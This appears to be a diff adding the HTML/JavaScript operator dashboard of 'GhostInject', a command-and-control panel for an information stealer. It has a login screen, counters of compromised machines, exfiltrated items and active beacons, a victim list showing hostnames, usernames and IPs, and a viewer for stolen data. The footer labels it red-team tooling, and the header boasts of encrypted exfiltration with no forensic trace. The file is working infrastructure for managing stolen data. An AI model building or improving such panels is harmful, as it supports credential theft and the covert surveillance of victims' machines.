@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostInject C2 — Painel de Controle</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0c0f;
+            font-family: 'Share Tech Mono', 'Courier New', monospace;
+            color: #c0ffc0;
+            padding: 20px;
+        }
+
+        /* Tela de login */
+        .login-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0c0f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+        .login-box {
+            background: #111418;
+            border: 2px solid #00ffaa;
+            border-radius: 20px;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+        }
+        .login-box h2 {
+            margin-bottom: 20px;
+            color: #00ffaa;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #1a1f24;
+            border: 1px solid #2a3a2a;
+            color: #c0ffc0;
+            border-radius: 8px;
+            font-family: monospace;
+        }
+        .login-box button {
+            background: #00ffaa;
+            color: #0a0c0f;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+        }
+        .login-error {
+            color: #ff8888;
+            margin-top: 10px;
+            font-size: 0.8rem;
+        }
+        .hidden {
+            display: none !important;
+        }
+
+        /* Header com efeito glitch */
+        .header {
+            border-bottom: 2px solid #00ffaa;
+            padding-bottom: 15px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            flex-wrap: wrap;
+        }
+
+        h1 {
+            font-size: 2rem;
+            letter-spacing: 2px;
+            text-shadow: 0 0 5px #00ffaa;
+        }
+
+        .badge {
+            font-size: 0.8rem;
+            background: #1a2a1f;
+            padding: 5px 12px;
+            border-radius: 20px;
+            border: 1px solid #00ffaa;
+            color: #00ffaa;
+        }
+
+        /* Cards de estatísticas */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: #111418;
+            border: 1px solid #2a3a2a;
+            border-radius: 12px;
+            padding: 20px;
+            transition: 0.2s;
+        }
+
+        .stat-card:hover {
+            border-color: #00ffaa;
+            box-shadow: 0 0 12px #00ffaa33;
+        }
+
+        .stat-value {
+            font-size: 2.4rem;
+            font-weight: bold;
+            color: #00ffaa;
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #8aa88a;
+            margin-top: 8px;
+        }
+
+        /* Tabela de vítimas */
+        .victims-section {
+            background: #0f1217;
+            border-radius: 16px;
+            border: 1px solid #2a3a2a;
+            overflow: hidden;
+        }
+
+        .section-title {
+            padding: 16px 20px;
+            background: #1a1f24;
+            border-bottom: 1px solid #2a3a2a;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .victim-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 20px;
+            border-bottom: 1px solid #1e2a1e;
+            transition: 0.1s;
+            cursor: pointer;
+        }
+
+        .victim-row:hover {
+            background: #1a241a;
+        }
+
+        .victim-info {
+            flex: 3;
+        }
+
+        .victim-name {
+            font-weight: bold;
+            color: #e0ffe0;
+        }
+
+        .victim-details {
+            font-size: 0.75rem;
+            color: #7a9a7a;
+            margin-top: 4px;
+        }
+
+        .victim-stats {
+            flex: 1;
+            text-align: right;
+        }
+
+        .exfil-count {
+            background: #1f3a1f;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            display: inline-block;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 10px;
+            background: #2faa2f;
+            margin-right: 8px;
+            box-shadow: 0 0 4px #2faa2f;
+        }
+
+        /* Modal de detalhes */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(4px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: #0c0f14;
+            border: 1px solid #00ffaa;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow: auto;
+            padding: 24px;
+            box-shadow: 0 0 40px rgba(0,255,170,0.2);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #2a3a2a;
+            padding-bottom: 12px;
+            margin-bottom: 20px;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: #ff5555;
+            font-size: 1.8rem;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .close-btn:hover {
+            color: #ff8888;
+        }
+
+        .exfil-item {
+            background: #11161f;
+            border-left: 3px solid #00ffaa;
+            padding: 12px;
+            margin-bottom: 12px;
+            border-radius: 8px;
+        }
+
+        .exfil-meta {
+            font-size: 0.7rem;
+            color: #8aa88a;
+            margin-bottom: 6px;
+        }
+
+        .exfil-data {
+            font-size: 0.75rem;
+            font-family: monospace;
+            word-break: break-all;
+            background: #00000044;
+            padding: 8px;
+            border-radius: 6px;
+            max-height: 200px;
+            overflow: auto;
+        }
+
+        .refresh-btn {
+            background: #1a2a1a;
+            border: 1px solid #3a5a3a;
+            color: #c0ffc0;
+            padding: 8px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-family: monospace;
+            transition: 0.2s;
+        }
+
+        .refresh-btn:hover {
+            background: #2a4a2a;
+            border-color: #00ffaa;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.7rem;
+            color: #4a6a4a;
+        }
+
+        .loading {
+            padding: 20px;
+            text-align: center;
+            color: #5a7a5a;
+        }
+
+        .error-msg {
+            color: #ff8888;
+            text-align: center;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- TELA DE LOGIN -->
+<div id="loginContainer" class="login-container">
+    <div class="login-box">
+        <h2>🔐 GHOSTINJECT C2</h2>
+        <input type="text" id="loginUsername" placeholder="username" value="admin">
+        <input type="password" id="loginPassword" placeholder="password">
+        <button onclick="doLogin()">LOGIN</button>
+        <div id="loginError" class="login-error"></div>
+    </div>
+</div>
+
+<!-- CONTEÚDO PRINCIPAL (inicialmente escondido) -->
+<div id="mainContent" class="hidden">
+    <div class="header">
+        <div>
+            <h1>GHOSTINJECT // C2 PANEL</h1>
+            <div style="font-size: 0.7rem; margin-top: 8px;">
+                stealer-first · encrypted exfiltration · zero forensic trace
+            </div>
+        </div>
+        <div>
+            <button class="refresh-btn" id="refreshBtn">⟳ SYNC</button>
+        </div>
+    </div>
+
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div class="stat-value" id="totalVictims">0</div>
+            <div class="stat-label">TARGETS COMPROMISED</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="totalExfils">0</div>
+            <div class="stat-label">EXFILTRATED ASSETS</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="activeBeacons">0</div>
+            <div class="stat-label">ACTIVE BEACONS (5min)</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="lastExfil">—</div>
+            <div class="stat-label">LAST EXFIL</div>
+        </div>
+    </div>
+
+    <div class="victims-section">
+        <div class="section-title">🎯 COMPROMISED MACHINES</div>
+        <div id="victimsList">
+            <div class="loading">⟳ loading targets...</div>
+        </div>
+    </div>
+
+    <div class="footer">
+        GhostInject · Red Team C2 Framework · <span id="timestamp"></span>
+    </div>
+</div>
+
+<!-- Modal de detalhes -->
+<div id="modal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <strong id="modalTitle">🔍 EXFIL DETAILS</strong>
+            <button class="close-btn" id="closeModalBtn">×</button>
+        </div>
+        <div id="modalBody">
+            <div class="loading">loading exfiltration data...</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let token = localStorage.getItem('c2_token');
+    
+    // Se já tem token, mostra o conteúdo
+    if (token) {
+        document.getElementById('loginContainer').classList.add('hidden');
+        document.getElementById('mainContent').classList.remove('hidden');
+        fetchData();
+    }
+    
+    // Função de login
+    async function doLogin() {
+        const username = document.getElementById('loginUsername').value;
+        const password = document.getElementById('loginPassword').value;
+        
+        try {
+            const res = await fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                token = data.token;
+                localStorage.setItem('c2_token', token);
+                document.getElementById('loginContainer').classList.add('hidden');
+                document.getElementById('mainContent').classList.remove('hidden');
+                fetchData();
+            } else {
+                document.getElementById('loginError').innerText = data.error || 'Invalid credentials';
+            }
+        } catch(e) {
+            document.getElementById('loginError').innerText = 'Connection error';
+        }
+    }
+    
+    // Busca dados com autenticação
+    async function fetchData() {
+        if (!token) return;
+        
+        try {
+            const res = await fetch('/victims', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            
+            if (res.status === 401) {
+                // Token expirado, faz logout
+                localStorage.removeItem('c2_token');
+                document.getElementById('loginContainer').classList.remove('hidden');
+                document.getElementById('mainContent').classList.add('hidden');
+                return;
+            }
+            
+            const data = await res.json();
+            if (data.success) {
+                renderVictims(data.victims);
+                updateStats(data.victims);
+            } else {
+                document.getElementById('victimsList').innerHTML = '<div class="error-msg">⚠️ failed to fetch data</div>';
+            }
+        } catch (e) {
+            console.error('fetch error', e);
+            document.getElementById('victimsList').innerHTML = '<div class="error-msg">⚠️ connection error</div>';
+        }
+    }
+
+    function renderVictims(victims) {
+        const container = document.getElementById('victimsList');
+        if (!victims || victims.length === 0) {
+            container.innerHTML = '<div class="loading">⚠️ no targets compromised yet</div>';
+            return;
+        }
+
+        container.innerHTML = victims.map(v => `
+            <div class="victim-row" onclick="showDetails('${v.id}')">
+                <div class="victim-info">
+                    <div class="victim-name">
+                        <span class="status-dot"></span> ${escapeHtml(v.machine_name)}
+                    </div>
+                    <div class="victim-details">
+                        ${escapeHtml(v.username)} · ${escapeHtml(v.ip_address)} · last: ${formatDate(v.last_seen)}
+                    </div>
+                </div>
+                <div class="victim-stats">
+                    <span class="exfil-count">📦 ${v.total_exfils}</span>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    function updateStats(victims) {
+        const total = victims.length;
+        const totalExfils = victims.reduce((sum, v) => sum + (v.total_exfils || 0), 0);
+        
+        let lastExfilStr = '—';
+        if (victims.length > 0) {
+            const lastSeen = victims.map(v => new Date(v.last_seen)).sort((a,b) => b - a)[0];
+            lastExfilStr = formatRelative(lastSeen);
+        }
+        
+        const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000);
+        const active = victims.filter(v => new Date(v.last_seen) > fiveMinAgo).length;
+        
+        document.getElementById('totalVictims').innerText = total;
+        document.getElementById('totalExfils').innerText = totalExfils;
+        document.getElementById('activeBeacons').innerText = active;
+        document.getElementById('lastExfil').innerText = lastExfilStr;
+    }
+
+    async function showDetails(victimId) {
+        if (!token) return;
+        
+        const modal = document.getElementById('modal');
+        const modalBody = document.getElementById('modalBody');
+        modalBody.innerHTML = '<div class="loading">⟳ loading exfiltration data...</div>';
+        modal.style.display = 'flex';
+        
+        try {
+            const res = await fetch(`/victim/${victimId}`, {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            const data = await res.json();
+            if (data.success && data.exfils) {
+                document.getElementById('modalTitle').innerHTML = `🔍 EXFIL FROM ${victimId.slice(0,8)}...`;
+                if (data.exfils.length === 0) {
+                    modalBody.innerHTML = '<div class="loading">📭 no exfil data yet</div>';
+                } else {
+                    modalBody.innerHTML = data.exfils.map(e => `
+                        <div class="exfil-item">
+                            <div class="exfil-meta">
+                                🧬 ${escapeHtml(e.data_type)} · ${formatDate(e.timestamp)} · ${e.data?.length || 0} chars
+                            </div>
+                            <div class="exfil-data">
+                                <pre style="white-space: pre-wrap; word-break: break-all;">${escapeHtml(e.data?.substring(0, 2000) || '—')}</pre>${e.data?.length > 2000 ? '<i>... (truncated)</i>' : ''}
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            } else {
+                modalBody.innerHTML = '<div class="error-msg">⚠️ failed to load exfil data</div>';
+            }
+        } catch (err) {
+            console.error(err);
+            modalBody.innerHTML = '<div class="error-msg">⚠️ error loading details</div>';
+        }
+    }
+
+    function formatDate(dateStr) {
+        try {
+            return new Date(dateStr).toLocaleString();
+        } catch(e) { 
+            return dateStr; 
+        }
+    }
+
+    function formatRelative(date) {
+        const diff = Math.floor((Date.now() - date) / 1000);
+        if (diff < 60) return 'just now';
+        if (diff < 3600) return `${Math.floor(diff/60)}m ago`;
+        if (diff < 86400) return `${Math.floor(diff/3600)}h ago`;
+        return date.toLocaleDateString();
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+    }
+
+    // Modal close handlers
+    document.getElementById('closeModalBtn').onclick = () => {
+        document.getElementById('modal').style.display = 'none';
+    };
+    
+    window.onclick = (e) => {
+        if (e.target === document.getElementById('modal')) {
+            document.getElementById('modal').style.display = 'none';
+        }
+    };
+
+    // Refresh button
+    document.getElementById('refreshBtn').onclick = () => {
+        fetchData();
+    };
+
+    // Timestamp update
+    function updateTimestamp() {
+        document.getElementById('timestamp').innerText = new Date().toLocaleString();
+    }
+    setInterval(updateTimestamp, 1000);
+    updateTimestamp();
+
+    // Auto refresh every 10 seconds
+    setInterval(() => {
+        if (token && document.getElementById('mainContent').classList.contains('hidden') === false) {
+            fetchData();
+        }
+    }, 10000);
+</script>
+</body>
+</html>
